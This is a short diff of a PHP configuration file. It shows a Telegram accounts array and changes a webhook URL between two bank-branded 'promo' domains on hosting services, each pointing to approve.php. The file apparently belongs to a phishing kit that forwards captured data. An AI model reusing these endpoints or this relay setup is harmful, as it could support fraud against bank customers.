@@ -25,5 +25,5 @@ $telegram_accounts = [
 
 ];
 
-$webhook_url = 'https://mercantilpromos.wasmer.app/approve.php';
+$webhook_url = 'https://mercantilpromocion.dockhosting.cloud/approve.php';
 ?>
